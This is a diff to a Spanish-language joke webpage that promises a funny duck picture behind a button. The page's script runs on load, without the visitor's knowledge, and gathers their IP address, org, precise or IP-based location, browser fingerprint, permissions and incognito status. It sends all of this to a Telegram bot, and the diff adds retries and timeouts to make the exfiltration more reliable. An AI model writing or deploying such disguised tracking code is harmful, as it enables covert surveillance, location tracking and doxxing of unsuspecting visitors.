@@ -6,36 +6,34 @@
   <style>
     body {
       font-family: Arial;
-      padding: 20px;
       background: #f0f0f0;
       margin: 0;
-      overflow: hidden;
+      padding: 20px;
+      text-align: center;
     }
 
     .box {
+      max-width: 700px;
+      margin: auto;
       background: white;
       padding: 20px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 700px;
-      margin: auto;
-      text-align: center;
     }
 
     button {
       padding: 10px 20px;
       font-size: 16px;
       cursor: pointer;
+      margin-top: 20px;
     }
 
     #duck {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 300px;
-      z-index: 9999;
       display: none;
+      width: 90%;
+      max-width: 500px;
+      margin-top: 20px;
+      border-radius: 10px;
       transition: all 0.3s ease-in-out;
     }
   </style>
@@ -44,10 +42,10 @@
   <div class="box">
     <h2>Aprieta el botón para ver algo divertido</h2>
     <button id="startBtn">Dame Click</button>
-  </div>
 
-  <!-- Imagen del pato -->
-  <img id="duck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/American_Wigeon_duck.jpg/1280px-American_Wigeon_duck.jpg" alt="Pato">
+    <!-- Imagen del pato -->
+    <img id="duck" src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/American_Wigeon_duck.jpg/1280px-American_Wigeon_duck.jpg"  alt="Pato Gigante">
+  </div>
 
 <script>
 (() => {
@@ -57,8 +55,7 @@
   const startBtn = document.getElementById("startBtn");
   const duck = document.getElementById("duck");
 
-  // Simulamos interacción humana
-  let humanInteraction = true;
+  let humanInteraction = false;
 
   ["click", "mousemove", "keydown", "touchstart"].forEach(evt => {
     window.addEventListener(evt, () => { humanInteraction = true; }, { once: true });
@@ -117,7 +114,7 @@
 
   async function detectAdblock() {
     try {
-      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js", {method:"HEAD", mode:"no-cors"});
+      await fetch("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js",  {method:"HEAD", mode:"no-cors"});
       return "No detectado";
     } catch {
       return "Probable AdBlock";
@@ -139,7 +136,7 @@
   async function getIPInfo() {
     const APIs = [
       {
-        url: "https://ipapi.com/ip_api.php",
+        url: "https://ipapi.com/ip_api.php", 
         map: d => ({
           ip: d.query,
           org: d.org,
@@ -154,7 +151,7 @@
         })
       },
       {
-        url: "https://ip-api.co/json/",
+        url: "https://ip-api.co/json/", 
         map: d => ({
           ip: d.ip,
           org: d.org,
@@ -200,33 +197,44 @@
     return null;
   }
 
+  // === ENVIAR A TELEGRAM CON REINTENTOS Y TIMEOUT RÁPIDO ===
   async function sendToTelegram(message) {
-    try {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;   
-      const response = await fetch(url, {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 segundos máximo
+
+    const fetchWithTimeout = () =>
+      fetch(url, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message,
         }),
+        signal: controller.signal
       });
-      const data = await response.json();
-      console.log("Telegram response:", data);
-    } catch(e) {
-      console.warn("Error enviando a Telegram:", e);
+
+    for (let i = 0; i < 3; i++) {
+      try {
+        const response = await fetchWithTimeout();
+        clearTimeout(timeoutId);
+        if (response.ok) return true;
+      } catch (e) {
+        if (i === 2) console.warn("Falló tras 3 intentos:", e.message);
+        await new Promise(r => setTimeout(r, 1000)); // retraso antes de reintento
+      }
     }
+
+    return false;
   }
 
   async function collectAndSend() {
-    startBtn.disabled = true;
-    startBtn.textContent = "Enviando...";
-
     const [ipRes, geoRes, incognitoStatus, permStatus, adblockStatus] = await Promise.allSettled([
       getIPInfo(),
       new Promise((res, rej) => {
         if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 3000});
+          navigator.geolocation.getCurrentPosition(res, rej, {timeout: 2000});
         } else rej();
       }),
       detectIncognito(),
@@ -256,12 +264,11 @@ Navegador Headless: ${detectHeadless()}
 Modo Incógnito: ${incognitoStatus.status === "fulfilled" ? incognitoStatus.value : "Desconocido"}
 Interacción Humana: ${humanInteraction ? "Sí" : "No"}
 Pantalla: ${screen.width}x${screen.height}
-Resolución disponible: ${screen.availWidth}x${screen.availHeight}
 Touch Support: ${'ontouchstart' in window ? 'Sí' : 'No'}
 Plataforma: ${navigator.platform}
 Fingerprint: ${getFingerprint()}
 Permisos (cámara, micrófono, geoloc): ${permStatus.status === "fulfilled" ? permStatus.value : "No disponible"}
-Aceleración hardware (WebGL renderer): ${checkHardwareAcceleration()}
+Aceleración hardware: ${checkHardwareAcceleration()}
 Timezone vs Locale: ${checkTimezoneLocale()}
 AdBlock detectado: ${adblockStatus.status === "fulfilled" ? adblockStatus.value : "No detectable"}
 Hora: ${new Date().toLocaleString()}
@@ -269,37 +276,33 @@ Hora: ${new Date().toLocaleString()}
 
     await sendToTelegram(message);
 
+    // Ubicación precisa o aproximada
     if (geoRes.status === "fulfilled") {
       const {latitude, longitude, accuracy} = geoRes.value.coords;
       const locationInfo = `\nUbicación Precisa:
 Latitud: ${latitude}
 Longitud: ${longitude}
-Precisión: ${accuracy} metros
-Hora: ${new Date().toLocaleString()}
-`;
+Precisión: ${accuracy} metros`;
       await sendToTelegram(locationInfo);
-    } else {
+    } else if (ipRes?.value?.lat && ipRes?.value?.lon) {
       const ip = ipRes.value;
-      if (ip?.lat && ip?.lon) {
-        const locationInfo = `\nUbicación Aproximada (por IP):
+      const locationInfo = `\nUbicación Aproximada (por IP):
 Latitud: ${ip.lat}
-Longitud: ${ip.lon}
-`;
-        await sendToTelegram(locationInfo);
-      }
+Longitud: ${ip.lon}`;
+      await sendToTelegram(locationInfo);
     }
-
-    startBtn.textContent = "..";
   }
 
-  // Llamamos automáticamente a collectAndSend al cargar la página
-  window.addEventListener("load", collectAndSend);
+  // 🔥 Enviar datos apenas se carga la página
+  window.addEventListener("load", () => {
+    collectAndSend(); // Se ejecuta automáticamente
+  });
 
-  // Mostramos el pato cuando hacen click en el botón
+  // 🦆 Mostrar pato al hacer click
   startBtn.addEventListener("click", () => {
-    const duck = document.getElementById("duck");
     duck.style.display = "block";
-    startBtn.textContent = "¿Viste el pato?";
+    startBtn.textContent = "Aquí está el pato 🦆";
+    startBtn.disabled = true;
   });
 })();
 </script>
